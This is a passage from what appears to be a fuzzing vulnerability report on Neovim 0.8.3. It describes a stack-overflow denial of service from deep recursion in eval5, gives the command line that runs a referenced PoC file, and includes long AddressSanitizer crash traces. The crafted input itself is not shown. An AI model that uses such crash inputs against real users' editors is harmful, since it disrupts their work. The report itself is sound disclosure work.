    #20 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #21 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #22 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #23 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #24 0x7f3f253e6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #25 0x7f3f253e6e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #26 0x472fe4 in _start (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x472fe4)

0x602000005df0 is located 0 bytes inside of 2-byte region [0x602000005df0,0x602000005df2)
allocated by thread T0 here:
    #0 0x4edead in malloc (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x4edead)
    #1 0x12edc72 in try_malloc /root/vuln/nvims/neovim-0.8.3/src/nvim/memory.c:82:15
    #2 0x12ede5c in xmalloc /root/vuln/nvims/neovim-0.8.3/src/nvim/memory.c:116:15
    #3 0x12ee3f6 in xmallocz /root/vuln/nvims/neovim-0.8.3/src/nvim/memory.c:195:15
    #4 0x1528a65 in yank_copy_line /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:2811:18
    #5 0x14c4f78 in op_yank_reg /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:2716:7
    #6 0x14b860d in op_delete /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:1546:7
    #7 0x14e4f06 in op_change /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:2450:14
    #8 0x1513461 in do_pending_operator /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:6160:13
    #9 0x148d2aa in normal_finish_command /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:918:5
    #10 0x142002d in normal_execute /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:1175:3
    #11 0x1418878 in normal_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:7420:9
    #12 0xda5358 in exec_normal /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:6446:5
    #13 0xda504e in exec_normal_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:6429:3
    #14 0xdb5ffb in ex_normal /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:6361:7
    #15 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #16 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #17 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #18 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #19 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #20 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #21 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #22 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #23 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #24 0xd54df0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:287:10
    #25 0x110d40e in exe_commands /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:1807:5
    #26 0x10f739c in main /root/vuln/nvims/neovim-0.8.3/src/nvim/main.c:534:5
    #27 0x7f3f253e6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: negative-size-param (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x4ed4f9) in __asan_memset
==3184437==ABORTING
```

# 11. Neovim <=0.8.3 Stack Overflow in `src/nvim/eval.c` 

## Description
Neovim versions up to and including 0.8.3 are affected by a vulnerability where a stack overflow occurs due to excessive recursion in the `eval5` function within the `src/nvim/eval.c` file. This issue is triggered when processing specially crafted input, such as a file or command, that causes deep recursion in the evaluation functions. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C220351](./C220351).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220351 -c :qa! 
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3184583==ERROR: AddressSanitizer: stack-overflow on address 0x7fffac874d60 (pc 0x000000ab9a68 bp 0x7fffac8753b0 sp 0x7fffac874d60 T0)
    #0 0xab9a68 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2603
    #1 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #2 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #3 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #4 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #5 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #6 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #7 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #8 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #9 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #10 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #11 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #12 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #13 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #14 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #15 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #16 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #17 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #18 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #19 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #20 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #21 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #22 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #23 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #24 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #25 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #26 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #27 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #28 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #29 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #30 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #31 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #32 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #33 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #34 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #35 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #36 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #37 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #38 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #39 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #40 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #41 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #42 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #43 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #44 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #45 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #46 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #47 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #48 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #49 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #50 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #51 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #52 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #53 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #54 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #55 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #56 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #57 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #58 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #59 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #60 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #61 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #62 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #63 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #64 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #65 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #66 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #67 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #68 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #69 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #70 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #71 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #72 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #73 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #74 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #75 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #76 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #77 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #78 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #79 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #80 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #81 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #82 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #83 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #84 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #85 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #86 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #87 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #88 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #89 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #90 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #91 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #92 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #93 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #94 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #95 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #96 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #97 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #98 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #99 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #100 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #101 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #102 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #103 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #104 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #105 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #106 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #107 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #108 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #109 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #110 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #111 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #112 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #113 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #114 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #115 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #116 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #117 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #118 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #119 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #120 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #121 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #122 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #123 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #124 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #125 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #126 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #127 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #128 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #129 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #130 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #131 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #132 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #133 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #134 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #135 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #136 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #137 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #138 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #139 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #140 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #141 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #142 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #143 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #144 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #145 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #146 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #147 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #148 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #149 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #150 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #151 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #152 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #153 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #154 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #155 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #156 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #157 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #158 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #159 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #160 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #161 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #162 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #163 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #164 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #165 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #166 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #167 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #168 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #169 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #170 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #171 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #172 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #173 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #174 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #175 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #176 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #177 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #178 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #179 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #180 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #181 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #182 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #183 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #184 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #185 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #186 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #187 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #188 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #189 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #190 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #191 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #192 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #193 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #194 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #195 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #196 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #197 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #198 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #199 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #200 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #201 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #202 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #203 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #204 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #205 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #206 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #207 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #208 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #209 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #210 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #211 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #212 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #213 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #214 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #215 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #216 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #217 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #218 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #219 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #220 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #221 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #222 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #223 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #224 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #225 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #226 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #227 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #228 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #229 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #230 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
    #231 0xab9b48 in eval5 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2612:7
    #232 0xab8506 in eval4 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2512:7
    #233 0xab79e8 in eval3 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2441:7
    #234 0xa60d78 in eval2 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2382:7
    #235 0xa5005a in eval1 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2318:7
    #236 0xac08a3 in eval7 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:3073:11
    #237 0xabc551 in eval6 /root/vuln/nvims/neovim-0.8.3/src/nvim/eval.c:2779:7
